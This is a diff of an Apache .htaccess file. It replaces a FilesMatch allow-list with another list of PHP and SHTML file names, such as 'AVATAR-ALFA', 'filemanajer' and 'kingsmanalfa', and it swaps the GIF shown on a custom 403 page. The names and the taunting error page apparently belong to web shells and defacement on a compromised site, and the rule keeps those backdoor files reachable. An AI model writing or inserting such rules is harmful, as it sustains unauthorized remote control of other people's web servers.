@@ -58,9 +58,9 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(anaksekolah.php|dpr.php|filemanajer.php|anaksekolah-MAR.php|filemanajer-MAR.php|ANAK-SEKOLAH-MAR.ShTmL)$">
+<FilesMatch "^(kingsmanalfa.ShTmL|ANAK-SEKOLAH.2.sHTmL|ANAK-SEKOLAH.3.ShtML|dpr(2).sHTmL|CHIP-JKT-UPLOADS.sHTmL|AVATAR-ALFA(2).ShTMl|anaksekolabisanih-MAR.php|filemanajer-MAR.php|ANAK-SEKOLAH-MAR.ShTmL|STILL-ALIVE-MAR.sHtML|kingsmanalfa-MAR.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
 Options -Indexes
-ErrorDocument 403 '<center><img src="https://media1.tenor.com/m/rKUibSGek-gAAAAd/mau-ngapain-om-noobpublic.gif"></img> <h3></font><br><h2></h2>
+ErrorDocument 403 '<center><img src="https://i.pinimg.com/originals/ed/53/43/ed5343d0474529949d5e7d20a884b7d5.gif"></img> <h3></font><br><h2></h2>
